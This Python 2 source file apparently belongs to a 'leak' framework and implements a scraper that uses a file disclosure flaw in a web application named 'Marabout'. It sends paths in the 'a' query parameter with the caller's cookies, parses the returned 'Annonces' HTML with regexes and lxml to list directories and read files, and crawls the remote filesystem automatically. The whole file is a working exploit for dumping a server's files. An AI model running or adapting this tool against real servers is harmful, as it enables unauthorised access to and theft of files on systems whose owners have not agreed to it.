#!/usr/bin/env python
# encoding: utf-8
from lxml import etree
import os
import re
import subprocess
import sys
import requests
from leak.base import Leaker, Parser, LeakerEOS
import xml.etree.ElementTree as ET


FILE = 1
DIR  = 2

class MaraboutParser(Parser):
    def get_patterns(self):
        return [
            # we need first DIR otherwise FILE matches it equally
            (DIR,  r'<h2>Annonces</h2>(<ul>.*</ul>).*</div> <!-- end main -->'),
            (FILE, r'<h2>Annonces</h2>(.*)</div> <!-- end main -->'),
        ]

    def extract_filenames(self, data):
        '''Extract from <li>s'''

        parser = etree.XMLParser(recover=True)

        root = ET.fromstring(data, parser=parser)

        return [_ for _ in root.iter('a')]

    def get_leak(self, data):
        patterns = self.get_patterns()

        for kind, pattern in self.get_patterns():
            p = re.compile(pattern, re.DOTALL|re.M)

            leak = None

            finding = p.findall(data)

            if len(finding) == 0:
                continue

            data = finding[0]

            if kind == DIR:
                return (kind, self.extract_filenames(data))
            else:
                return (kind, data)

        return leak

WAITING  = 0
EXPLORED = 1
ERROR    = 2


class MaraboutLeaker(Leaker):
    def __init__(self, url, cookies={}, params={}, **kwargs):
        super(MaraboutLeaker, self).__init__(parser=MaraboutParser(), **kwargs)

        self.url     = url
        self.cookies = cookies
        self.params  = params

        self.filesystem = {os.path.normpath(params['a']): WAITING}
        self.paths      = [params['a']]
        self.finished = False

    def has_finished(self):
        return self.finished

    def get_next_input_parameter(self):
        if len(self.paths) == 0:
            raise LeakerEOS('No more paths')

        return self.paths.pop(0)

    def input(self):
        self.params.update({'a': self.get_next_input_parameter()})
        response = requests.get(self.url, params=self.params, cookies=self.cookies)

        return response.text

    def update(self, leak_representation):
        '''Update the filesystem representation'''
        kind = leak_representation[0]
        filepath = self.params['a']

        self.filesystem[os.path.normpath(filepath)] = EXPLORED

        contents = leak_representation[1]

        if kind == DIR:
            # add the paths just found to the list avoiding the one already in
            paths = [os.path.join(filepath , _.text) for _ in leak_representation[1]]
            contents = filter(lambda x: not self.filesystem.has_key(os.path.normpath(x)), paths)
            self.paths += contents

        return (kind, filepath, contents)

    def output(self, leak_representation):
        kind, filename, content = leak_representation
        print filename, os.path.normpath(filename)

    def on_exit(self):
        print self.filesystem
        sys.exit(0)